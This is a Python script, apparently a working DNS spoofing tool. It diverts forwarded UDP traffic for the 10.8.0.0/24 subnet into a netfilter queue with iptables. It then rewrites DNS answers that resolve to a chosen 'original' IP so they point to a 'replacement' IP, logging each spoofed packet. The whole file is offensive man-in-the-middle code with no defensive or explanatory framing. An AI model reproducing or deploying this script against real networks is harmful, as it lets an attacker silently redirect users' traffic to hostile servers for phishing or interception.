from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
import os
import nfqueue
from scapy.all import *
import argparse
import threading
import signal

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--original", help="Original IP")
    parser.add_argument("-r", "--replacement", help="Replacement IP")
    return parser.parse_args()

def cb(payload):
    data = payload.get_data()
    pkt = IP(data)
    # print packet
    # pkt.show()
    if pkt.haslayer(DNSRR) and \
       pkt[DNS].an and \
       any(arg_parser().original == pkt[DNS].an[i].rdata for i in range(pkt[DNS].ancount)):
        spoofed_pkt(payload, pkt, arg_parser().replacement)
    else:
        payload.set_verdict(nfqueue.NF_ACCEPT)

def spoofed_pkt(payload, pkt, rIP):
    ip = pkt['IP']
    udp = pkt['UDP']
    dns = pkt['DNS']
    for i in range(dns.ancount):
        dnsrr = dns.an[i]

        if (dnsrr.rdata == arg_parser().original):
            dnsrr.rdata = rIP
            pkt[IP].len = len(str(pkt))
            pkt[UDP].len = len(str(pkt[UDP]))
            del pkt[IP].chksum
            del pkt[UDP].chksum

    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
    print ('[+] Sent spoofed packet for %s' % pkt[DNSQR].qname[:-1])

class Queued(object):
    def __init__(self):
        self.q = nfqueue.queue()
        self.q.set_callback(cb)
        self.q.fast_open(10500, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
        print('[*] Waiting for data')
    def fileno(self):
        return self.q.get_fd()
    def doRead(self):
        self.q.process_pending(100)
    def connectionLost(self, reason):
        reactor.removeReader(self)
    def logPrefix(self):
        return 'queue'

def main(args):
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")

    # the response-packet will not pass through the nat table!
    # see this comment: https://superuser.com/questions/1210742/does-iptables-perform-a-automatically-snat-for-response-packet-if-it-does-when#comment1851968_1225093
    os.system('iptables -t filter -I FORWARD 1 -p udp --dst 10.8.0.0/24 -j NFQUEUE --queue-num 10500')

    Queued()
    rctr = threading.Thread(target=reactor.run, args=(False,))
    rctr.daemon = True
    rctr.start()

    def signal_handler(signal, frame):
        print('removing iptables rule and turning off IP forwarding...')
        os.system('iptables -t filter -D FORWARD -p udp --dst 10.8.0.0/24 -j NFQUEUE --queue-num 10500')
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    while 1:
        time.sleep(1.5)

main(arg_parser())
